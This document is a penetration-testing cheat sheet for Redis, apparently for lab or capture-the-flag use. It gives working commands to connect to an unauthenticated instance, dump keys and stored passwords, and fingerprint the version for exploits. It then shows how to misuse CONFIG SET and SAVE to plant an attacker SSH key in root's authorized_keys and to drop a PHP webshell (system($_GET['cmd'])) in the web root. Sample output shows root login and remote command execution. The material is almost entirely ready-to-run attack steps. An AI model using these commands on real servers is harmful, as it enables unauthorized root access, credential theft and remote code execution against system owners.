# Redis (6379)

### Connect (no auth)

```bash
redis-cli -h $IP
```

> Try without password

**Why:** Default: no authentication

<details>
<summary>Example Output</summary>

```
redis-cli -h 10.10.10.5
10.10.10.5:6379> INFO server
redis_version:5.0.7
10.10.10.5:6379> KEYS *
1) "session:admin"
2) "credentials"
```
</details>

---

### Dump all keys

```bash
KEYS *
GET <key>
```

> After connecting

**Why:** Stored credentials, session data

<details>
<summary>Example Output</summary>

```
KEYS *
1) "session:admin:token"
2) "user:admin:password"
3) "config:db_pass"

GET user:admin:password
"SuperSecret123!"
(Credentials stored in Redis)
```
</details>

---

### Server info

```bash
INFO
```

> Version, memory, clients

**Why:** Check version for exploits

<details>
<summary>Example Output</summary>

```
INFO
redis_version:5.0.7
os:Linux 5.4.0-42-generic x86_64
connected_clients:2
(Check version for CVEs, 5.x has several RCEs)
```
</details>

---

### Write SSH key

```bash
redis-cli -h $IP
CONFIG SET dir /root/.ssh/
CONFIG SET dbfilename authorized_keys
SET payload '<ssh-rsa key>'
SAVE
```

> Write your SSH key to server

**Why:** Root SSH access

<details>
<summary>Example Output</summary>

```
CONFIG SET dir /root/.ssh/
CONFIG SET dbfilename authorized_keys
SET payload 'ssh-rsa AAAA...your_key...'
SAVE

ssh root@10.10.10.5
root@target:~# whoami
root
(Root SSH access via Redis write)
```
</details>

---

### Write webshell

```bash
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename shell.php
SET payload '<?php system($_GET["cmd"]); ?>'
SAVE
```

> If web server present

**Why:** RCE via webshell

<details>
<summary>Example Output</summary>

```
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename shell.php
SET payload '<?php system($_GET["cmd"]); ?>'
SAVE

curl http://10.10.10.5/shell.php?cmd=whoami
www-data
(RCE via Redis webshell write)
```
</details>

---
